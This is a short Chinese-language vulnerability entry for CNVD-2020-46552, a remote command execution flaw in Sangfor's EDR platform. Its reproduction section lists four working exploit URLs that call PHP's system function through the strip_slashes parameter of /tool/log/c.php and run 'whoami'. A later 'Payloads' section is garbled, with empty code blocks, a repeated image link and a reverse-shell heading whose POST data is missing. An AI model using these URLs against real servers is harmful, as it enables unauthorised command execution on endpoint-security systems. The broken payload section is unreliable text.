# 深信服 EDR c.php 远程命令执行漏洞 CNVD-2020-46552

## 漏洞描述
深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，可向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程代码控制执行。

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
```plain
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami
```



![img](images/202202091913721.png)

## Payloads
```
![img](images/202202091913721.png)



**反弹shell**
```
```
向 **/tool/log/c.php**  POST以下数据即可
```
